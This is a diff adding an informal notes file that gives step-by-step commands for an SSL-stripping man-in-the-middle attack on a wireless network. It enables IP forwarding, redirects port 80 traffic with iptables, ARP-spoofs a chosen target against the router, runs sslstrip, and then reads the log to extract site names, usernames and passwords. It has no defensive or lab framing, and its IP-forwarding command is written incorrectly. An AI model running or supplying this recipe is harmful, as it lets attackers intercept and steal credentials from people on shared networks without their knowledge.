@@ -1,0 +1,32 @@
+SSL Stripper
+-------------
+su - 
+type password 
+echo > 1 /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 (Might need to check a port already open)
+diff window cause it gets clutter
+arpspoof -i wlan0 -t (Target to strip) -r (Router ip i.e 192.168.0.1 
+
+su -
+
+sslstrip -l 8080
+
+NOTE: 
+Can change port 8080 in SSLStrip and ReDir to another open one on the network
+
+IMPORTANT:
+File with the strips will be sslstrip.log
+get it in cmd by 
+cat sslstrip.log
+Decode through the big gloc of thing find -
+Site:
+Username:
+Password:
+Formatted in the code as -
+URL=
+username=
+password=
+^ Can change depending on site.
+
+
